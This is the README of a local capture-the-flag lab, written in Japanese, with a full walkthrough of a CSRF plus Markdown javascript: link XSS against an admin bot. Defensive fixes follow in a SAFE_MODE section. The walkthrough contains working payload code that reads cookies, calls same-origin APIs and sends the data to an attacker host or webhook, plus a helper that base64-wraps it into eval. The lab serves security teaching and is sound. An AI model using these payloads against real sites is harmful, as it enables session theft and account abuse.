# Markdown XSS Cookie Lab

最小構成の admin bot 型 XSS CTF です。CSRF で admin セッション内の `greeting` を書き換え、Markdown リンク URL のスキーム検証不足から `javascript:` リンクを生成し、bot のクリックで学習用 FLAG Cookie を送信します。

## 起動

```bash
docker compose up --build
```

- app: `http://localhost:3000`
- attacker: `http://localhost:4000`
- bot: Docker 内部専用

## ローカル確認手順

1. `docker compose up --build`
2. `http://localhost:3000/help/search` で Markdown リンクの挙動を調べる
3. `greeting` に入れる Markdown XSS payload を作る
4. payload を URL エンコードする
5. `http://localhost:3000/report` を開く
6. 次の形式で報告する

```text
http://localhost:4000/lab?greeting=<URLエンコードしたMarkdown payload>
```

7. admin bot の実行完了を待つ
8. `http://localhost:4000/loot` を開く
9. `flag=FLAG{local_markdown_xss_cookie_lab}` が表示されれば成功

## 外部Webhook確認手順

1. HTTP または HTTPS の Webhook URL を用意する
2. Webhook URL へ送信する JavaScript payload を作る
3. payload を Markdown の `javascript:` リンクに包む
4. Markdown 全体を URL エンコードする
5. `http://localhost:3000/report` を開く
6. 次の形式で報告する

```text
http://localhost:4000/lab?greeting=<URLエンコードしたMarkdown payload>
```

7. Webhook に次のような値が届けば成功

```text
flag=FLAG{local_markdown_xss_cookie_lab}
```

## 詳細解法

`http://localhost:4000/lab` は完成済み exploit ではありません。`greeting` クエリで渡された Markdown を admin bot に CSRF 送信するだけの汎用 payload host です。

何も指定せずに `http://localhost:4000/lab` を報告しても FLAG は取れません。プレイヤー側で Markdown payload を組み立て、次の形式にして報告します。

```text
http://localhost:4000/lab?greeting=<URLエンコードしたMarkdown payload>
```

URL エンコードが面倒な場合は、ブラウザで `http://localhost:4000/lab` を開くと report URL を組み立てるだけのフォームがあります。このフォームは exploit を生成しません。入力した `greeting` を URL エンコードして `/lab?greeting=...` にするだけです。

### 1. 攻撃対象の状態保存を確認する

`http://localhost:3000/help/search` を開くと、`query` と `greeting` を保存するフォームがあります。`greeting` は同じ疑似セッションの `/help/search` に、次の HTML の中で表示されます。

```html
<div class="assistant-message">
  <!-- Markdown rendered greeting -->
</div>
```

通常ユーザーとして、まず次のような Markdown を `greeting` に入れて保存します。

```markdown
[open](javascript:alert(1))
```

保存後のページでリンクが表示され、クリックすると `alert(1)` が実行されます。この時点で分かることは、HTML タグ直書きではなく Markdown リンクの URL として `javascript:` が通っている、という点です。

### 2. admin bot のクリック条件を読む

bot は `/report` から渡された allowlist 済み URL を開いた後、最終的に `app` の `/help/search` に到達すると、次のセレクタの最初のリンクをクリックします。

```css
.assistant-message a
```

つまり、admin bot のセッション内に `greeting=[open](javascript:...)` を保存できれば、bot のクリックで XSS が発火します。

### 3. CSRF で admin 側の greeting を書き換える

脆弱版では `/help/search` の POST に CSRF トークン検証がありません。そのため、attacker 側のページから admin bot に自動 POST させられます。

`attacker` の `/lab?greeting=...` は、渡された `greeting` を次のようなフォームに入れて自動送信します。bot は Docker 内部で動くため、CSRF フォームの送信先は `http://app:3000/help/search` です。

```html
<form method="post" action="http://app:3000/help/search">
  <input type="hidden" name="query" value="test">
  <input type="hidden" name="greeting" value="[open details](javascript:<payload>)">
</form>
<script>
  document.forms[0].submit();
</script>
```

このページを admin bot に開かせるため、プレイヤーは `/report` に `http://localhost:4000/lab?greeting=...` を報告します。`/report` は `localhost:4000` を Docker 内部の attacker サービスへ変換して bot に渡します。

### 4. XSS payload を組み立てる

payload では、この CTF 用に意図的に読める `flag` Cookie だけを抽出します。`admin_session` は HttpOnly なので読みません。localStorage、sessionStorage、環境変数、ローカルファイル、OS 情報も読みません。

読みやすく書くと、payload の中身は次の処理です。

```js
void (async () => {
  const flagCookie = document.cookie
    .split("; ")
    .find((part) => part.startsWith("flag=")) || "";
  const flag = flagCookie.startsWith("flag=") ? flagCookie.slice("flag=".length) : "";

  const me = await fetch("/api/me", {
    credentials: "same-origin"
  }).then((response) => response.json());

  await fetch("/api/conversations/latest/subscribers", {
    method: "POST",
    credentials: "same-origin",
    headers: { "content-type": "application/json" },
    body: JSON.stringify({ email: "attacker@example.test" })
  });

  const body = JSON.stringify({
    cookie: flagCookie,
    flag,
    me
  });

  if (!navigator.sendBeacon("http://attacker:4000/collect", body)) {
    await fetch("http://attacker:4000/collect", {
      method: "POST",
      mode: "no-cors",
      body
    });
  }
})();
```

成功すると `/collect` に次の JSON 相当が届きます。

```json
{
  "cookie": "flag=FLAG{local_markdown_xss_cookie_lab}",
  "flag": "FLAG{local_markdown_xss_cookie_lab}",
  "me": {
    "role": "admin",
    "email": "admin@example.test"
  }
}
```

### 5. Markdown リンク用に payload を包む

JavaScript をそのまま Markdown URL に入れると、括弧や空白で Markdown パーサに壊されやすくなります。そのため、payload を Base64 にして、次の形にします。

```markdown
[open details](javascript:eval(atob("<base64 payload>")))
```

このリンクが `/help/search` で `<a href="javascript:eval(atob(...))">open details</a>` として表示され、admin bot のクリックで実行されます。

ブラウザの DevTools Console などで、次のように Markdown と報告 URL を作れます。

```js
const js = `void (async () => {
  const flagCookie = document.cookie
    .split("; ")
    .find((part) => part.startsWith("flag=")) || "";
  const flag = flagCookie.startsWith("flag=") ? flagCookie.slice("flag=".length) : "";
  const me = await fetch("/api/me", { credentials: "same-origin" }).then((response) => response.json());
  await fetch("/api/conversations/latest/subscribers", {
    method: "POST",
    credentials: "same-origin",
    headers: { "content-type": "application/json" },
    body: JSON.stringify({ email: "attacker@example.test" })
  });
  const body = JSON.stringify({ cookie: flagCookie, flag, me });
  if (!navigator.sendBeacon("http://attacker:4000/collect", body)) {
    await fetch("http://attacker:4000/collect", { method: "POST", mode: "no-cors", body });
  }
})();`;

const markdown = `[open details](javascript:eval(atob("${btoa(js)}")))`;
const reportUrl = `http://localhost:4000/lab?greeting=${encodeURIComponent(markdown)}`;
console.log(reportUrl);
```

### 6. 報告して結果を見る

作成した `reportUrl` を `http://localhost:3000/report` に報告します。

```text
http://localhost:4000/lab?greeting=<URLエンコードしたMarkdown payload>
```

`/report` のレスポンスは bot の内部状態を返しません。リンクが見つかったか、クリックできたかは bot コンテナのログで確認できます。

```bash
docker compose logs bot
```

最後に `http://localhost:4000/loot` を開き、次が表示されれば解けています。

```text
flag=FLAG{local_markdown_xss_cookie_lab}
```

同一オリジン API 操作も確認する場合は、`http://localhost:3000/api/conversations/latest` を開きます。XSS 成立後は `attacker@example.test` が `subscribers` に追加されています。

外部 Webhook に送る場合は、Webhook URL を URL エンコードして次の形式で報告します。

```text
http://localhost:4000/lab?greeting=<URLエンコードしたMarkdown payload>
```

## 脆弱性の要点

- `/report` は allowlist 済み URL だけを admin bot に渡します。
- admin bot は `admin_session=1` と学習用 `flag=FLAG{local_markdown_xss_cookie_lab}` Cookie を持った状態で報告 URL を開きます。
- `attacker` の `/lab` は CSRF で `http://app:3000/help/search` に `greeting` を POST します。
- 脆弱版では `/help/search` の POST に CSRF トークン検証がありません。
- `greeting` は HTML タグを無効化した Markdown として表示されますが、Markdown リンク URL のスキーム検証が不足しています。
- `[open](javascript:...)` が `.assistant-message a` として生成され、admin bot が通常クリックします。
- XSS が成立すると `document.cookie` から、この CTF 用に意図的に JavaScript から読める `flag` Cookie だけを抽出して Webhook または `/collect` に送ります。
- XSS が成立すると Cookie が読めるだけでなく、`/api/conversations/latest/subscribers` のような同一オリジン API 操作も可能です。

## SAFE_MODE

次のように起動すると修正版として動作します。

```bash
SAFE_MODE=true docker compose up --build
```

SAFE_MODE では以下を行います。

- `/help/search` の POST に CSRF トークン検証を入れる
- Markdown リンク URL の許可スキームを `http:`, `https:`, `mailto:` のみにする
- `javascript:`, `data:`, `vbscript:` を拒否する
- Markdown レンダリング後に HTML サニタイズを入れる
- 可能な補助防御として bot がセットする `flag` Cookie に `HttpOnly` を付ける

`HttpOnly` は XSS そのものを防ぐ対策ではありません。XSS が成立すると Cookie が読めない場合でも同一オリジン API 操作は可能です。このラボの主防御は CSRF 対策と Markdown URL スキーム検証です。

## 注意書き

- この CTF で Webhook に送る値は、学習用に意図的にセットした疑似 FLAG Cookie と疑似ユーザー情報だけです。
- 実サービスの Cookie や実データを窃取する目的ではありません。
- 実在サービス・第三者環境では使用しないでください。
- 本番では認証 Cookie や機密値に `HttpOnly`, `Secure`, `SameSite` を適切に設定してください。
- bot 自身は環境変数、ローカルファイル、OS 情報、認証情報を Webhook に送る処理を持ちません。

## ファイル構成

```text
docker-compose.yml
app/Dockerfile
app/package.json
app/src/server.js
attacker/Dockerfile
attacker/package.json
attacker/src/server.js
bot/Dockerfile
bot/package.json
bot/src/server.js
README.md
```
